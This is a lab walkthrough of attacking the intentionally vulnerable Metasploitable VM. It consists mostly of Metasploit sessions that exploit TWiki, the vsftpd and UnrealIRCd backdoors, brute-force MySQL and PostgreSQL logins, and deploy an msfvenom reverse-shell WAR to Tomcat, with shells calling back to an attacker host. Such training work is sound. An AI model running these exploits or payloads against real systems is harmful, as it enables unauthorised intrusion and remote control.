# Writeup

> The Metasploitable virtual machine is an intentionally vulnerable version of Ubuntu Linux designed for testing security tools and demonstrating common vulnerabilities.

In this writeup, we will try to find most of the security issues affecting the VM.

## I. Recon

A quick nmap scan gives us :

```
nmap 192.168.195.128  

Starting Nmap 7.60 ( https://nmap.org ) at 2018-06-02 17:13 CEST
Nmap scan report for 192.168.195.128
Host is up (0.0019s latency).
Not shown: 977 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
23/tcp   open  telnet
25/tcp   open  smtp
53/tcp   open  domain
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
512/tcp  open  exec
513/tcp  open  login
514/tcp  open  shell
1099/tcp open  rmiregistry
1524/tcp open  ingreslock
2049/tcp open  nfs
2121/tcp open  ccproxy-ftp
3306/tcp open  mysql
5432/tcp open  postgresql
5900/tcp open  vnc
6000/tcp open  X11
6667/tcp open  irc
8009/tcp open  ajp13
8180/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 4.47 seconds
```

We can see that many services are running on this machine, let's start with the web server running on port 80.

# II. Apache

We quickly learn that the web server is Apache 2.2.8. It use PHP 5.2.4 and there is, at the root of the server, a page that contains 5 links to 5 differents apps :

* TWiki
* phpMyAdmin
* Muttilidae
* DVWA
* WebDAV

## TWiki

TWiki is a perl-based web application used to run a collaborative platform. The last stable release is 6.0.2 (released in 2015) but the server run a version that dates back to 2003. 

A little google search reveals quite a few RCE like CVE-2004-1037 and CVE-2008-5305.

Let's have a closer look at these vulnerability by searching if there is any existent metasploit module in relation to TWiki.

```
$ msfconsole 

msf > search twiki

Matching Modules
================

   Name                                    Disclosure Date  Rank       Description
   ----                                    ---------------  ----       -----------
   exploit/unix/http/twiki_debug_plugins   2014-10-09       excellent  TWiki Debugenableplugins Remote Code Execution
   exploit/unix/webapp/moinmoin_twikidraw  2012-12-30       manual     MoinMoin twikidraw Action Traversal File Upload
   exploit/unix/webapp/twiki_history       2005-09-14       excellent  TWiki History TWikiUsers rev Parameter Command Execution
   exploit/unix/webapp/twiki_maketext      2012-12-15       excellent  TWiki MAKETEXT Remote Command Execution
   exploit/unix/webapp/twiki_search        2004-10-01       excellent  TWiki Search Function Arbitrary Command Execution
```

The module `exploit/unix/webapp/twiki_history` seems interesting.

```
msf> use exploit/unix/webapp/twiki_history
msf exploit(unix/webapp/twiki_history) > set RHOST 192.168.195.128
msf exploit(unix/webapp/twiki_history) > set payload cmd/unix/bind_netcat
msf exploit(unix/webapp/twiki_history) > exploit -j
[*] Started bind handler
[*] Command shell session 1 opened (192.168.195.1:56970 -> 192.168.195.128:56789) at 2018-06-03 13:29:23 +0200
```

We get an unix shell, whith `post/multi/manage/shell_to_meterpreter`, we can upgrade this shell to a Meterpreter one.

```
msf exploit(unix/webapp/twiki_history) > use post/multi/manage/shell_to_meterpreter 
msf post(multi/manage/shell_to_meterpreter) > set SESSION 1
msf post(multi/manage/shell_to_meterpreter) > set LHOST 192.168.195.1
msf post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.168.195.1:4433 
[*] Sending stage (853256 bytes) to 192.168.195.128
[*] Meterpreter session 3 opened (192.168.195.1:4433 -> 192.168.195.128:46146) at 2018-06-03 13:32:10 +0200
[*] Command stager progress: 100.00% (773/773 bytes)
[*] Post module execution completed
meterpreter > getuid
Server username: uid=33, gid=33, euid=33, egid=33
```

So we get a nice shell, let's move on now to another web app.

## Phpmyadmin (and MySQL)

We can assume that phpmyadmin is backed by MySQL that is listening on port 3306.

Let's try to use `auxiliary/scanner/mysql/mysql_login` with a small pass file (500 most commons) to brute-force the MySQL credentials.

```
msf > use auxiliary/scanner/mysql/mysql_login
msf auxiliary(scanner/mysql/mysql_login) > set USERNAME root
msf auxiliary(scanner/mysql/mysql_login) > set PASS_FILE ~/Desktop/Tools/500.txt
msf auxiliary(scanner/mysql/mysql_login) > set RHOSTS 192.168.195.128
msf auxiliary(scanner/mysql/mysql_login) > set BLANK_PASSWORDS true
msf auxiliary(scanner/mysql/mysql_login) > run

[+] 192.168.195.128:3306  - 192.168.195.128:3306 - Found remote MySQL version 5.0.51a
[!] 192.168.195.128:3306  - No active DB -- Credential data will not be saved!
[+] 192.168.195.128:3306  - 192.168.195.128:3306 - Success: 'root:'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

So the MySQL root password is blank... But we can't connect as root with phpmyadmin, maybe it does not permit to login as root. However, we are able to connect to the db with `mysql -u root -h 192.168.195.128 -P 3306 -p --skip-ssl`.
With that, we create a new user and grant him all privileges : 

```
mysql> create user 'user' identified by 'password';
Query OK, 0 rows affected (0,00 sec)

mysql> grant all privileges on * to 'user';
Query OK, 0 rows affected (0,00 sec)

mysql> flush privileges;
Query OK, 0 rows affected (0,00 sec)
```

We can now login with this user on phpmyadmin.


## FTP

The FTP server in use is vsftpd 2.3.4. This version is know for containing a backdoor that is easly exploitable with the `exploit/unix/ftp/vsftpd_234_backdoor` metasploit module. 

```
msf > use exploit/unix/ftp/vsftpd_234_backdoor
msf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOST 192.168.195.128
msf exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 192.168.195.128:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.195.128:21 - USER: 331 Please specify the password.
[+] 192.168.195.128:21 - Backdoor service has been spawned, handling...
[+] 192.168.195.128:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.

[*] Command shell session 1 opened (192.168.195.1:59748 -> 192.168.195.128:6200) at 2018-06-06 18:54:41 +0200

uid=0(root) gid=0(root)
```


## IRC

Like vsftpd, the IRC server has a backdoor and it can be exploited with a module : `unix/ftp/vsftpd_234_backdoor`.
```
msf > use exploit/unix/irc/unreal_ircd_3281_backdoor 
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOST 192.168.195.128
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > run

[*] Started reverse TCP double handler on 192.168.195.1:4444 
[*] 192.168.195.128:6667 - Connected to 192.168.195.128:6667...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
[*] 192.168.195.128:6667 - Sending backdoor command...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo id4WBKhmd1VdD85V;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "id4WBKhmd1VdD85V\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 2 opened (192.168.195.1:4444 -> 192.168.195.128:55144) at 2018-06-06 18:59:02 +0200

id
uid=0(root) gid=0(root)
```

## Apache tomcat

After simply Googling for the tomcat manager defaults credentials, we can log in with tomcat/tomcat. From there, we can upload a war backdoor to gain a shell :

* First, let's create the war file with msfvenom
    ```
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.195.1 LPORT=9999 -f war > mywar.war  
    Payload size: 123 bytes
    Final size of war file: 1596 bytes
    ```
* Then, we look for the name of the jsp in the war file 
    ```
    jar xvf mywar.war  
    créé : META-INF/
    décompressé : META-INF/MANIFEST.MF
    créé : WEB-INF/
    décompressé : WEB-INF/web.xml
    décompressé : mgcuxecsndzm.jsp
    ```
* We can now deploy our war file, create an meterpreter handler for our payload and gain a shell.
    ```
    msf > use exploit/multi/handler 
    msf exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
    payload => linux/x86/meterpreter/reverse_tcp
    msf exploit(multi/handler) > set LHOST 192.168.195.1
    LHOST => 192.168.195.1
    msf exploit(multi/handler) > set LPORT 9999
    LPORT => 9999
    msf exploit(multi/handler) > run

    [*] Started reverse TCP handler on 192.168.195.1:9999
    ```
    The handler is listening so we can go to /mywar/mgcuxecsndzm.jsp
    ```
    [*] Sending stage (853256 bytes) to 192.168.195.128
    [*] Meterpreter session 1 opened (192.168.195.1:9999 -> 192.168.195.128:54639) at 2018-06-07 12:02:23 +0200

    meterpreter > shell
    Process 6635 created.
    Channel 1 created.
    id
    uid=110(tomcat55) gid=65534(nogroup) groups=65534(nogroup)
    ```

    ## Postgresql

    We the module `auxiliary/scanner/postgres/postgres_login`, we can try to find the postgresql credentials.

    ```
    msf > use auxiliary/scanner/postgres/postgres_login
    msf auxiliary(scanner/postgres/postgres_login) > set RHOSTS 192.168.1951.128
    RHOSTS => 192.168.1951.128
    msf auxiliary(scanner/postgres/postgres_login) > run
    [-] Auxiliary failed: Msf::OptionValidateError The following options failed to validate: RHOSTS.
    msf auxiliary(scanner/postgres/postgres_login) > set RHOSTS 192.168.195.128
    RHOSTS => 192.168.195.128
    msf auxiliary(scanner/postgres/postgres_login) > run

    [-] 192.168.195.128:5432 - LOGIN FAILED: :@template1 (Incorrect: Invalid username or password)
    [-] 192.168.195.128:5432 - LOGIN FAILED: :tiger@template1 (Incorrect: Invalid username or password)
    [-] 192.168.195.128:5432 - LOGIN FAILED: :postgres@template1 (Incorrect: Invalid username or password)
    [-] 192.168.195.128:5432 - LOGIN FAILED: :password@template1 (Incorrect: Invalid username or password)
    [-] 192.168.195.128:5432 - LOGIN FAILED: :admin@template1 (Incorrect: Invalid username or password)
    [-] 192.168.195.128:5432 - LOGIN FAILED: postgres:@template1 (Incorrect: Invalid username or password)
    [-] 192.168.195.128:5432 - LOGIN FAILED: postgres:tiger@template1 (Incorrect: Invalid username or password)
    [+] 192.168.195.128:5432 - Login Successful: postgres:postgres@template1
    [-] 192.168.195.128:5432 - LOGIN FAILED: scott:@template1 (Incorrect: Invalid username or password)
    [-] 192.168.195.128:5432 - LOGIN FAILED: scott:tiger@template1 (Incorrect: Invalid username or password)
    [-] 192.168.195.128:5432 - LOGIN FAILED: scott:postgres@template1 (Incorrect: Invalid username or password)
    [-] 192.168.195.128:5432 - LOGIN FAILED: scott:password@template1 (Incorrect: Invalid username or password)
    [-] 192.168.195.128:5432 - LOGIN FAILED: scott:admin@template1 (Incorrect: Invalid username or password)
    [-] 192.168.195.128:5432 - LOGIN FAILED: admin:@template1 (Incorrect: Invalid username or password)
    [-] 192.168.195.128:5432 - LOGIN FAILED: admin:tiger@template1 (Incorrect: Invalid username or password)
    [-] 192.168.195.128:5432 - LOGIN FAILED: admin:postgres@template1 (Incorrect: Invalid username or password)
    [-] 192.168.195.128:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
    [-] 192.168.195.128:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
    [-] 192.168.195.128:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
    [-] 192.168.195.128:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
    ```

    We see that postgres/postgres are valids credentials. Now, let's inspect the content of the database.
    ```
    $ psql -h 192.168.195.128 -U postgres
    postgres=# \l --> list the databases
    postgres=# \dt --> list the tables
    ```
    Unfortunately, the database appears to be empty :(
    

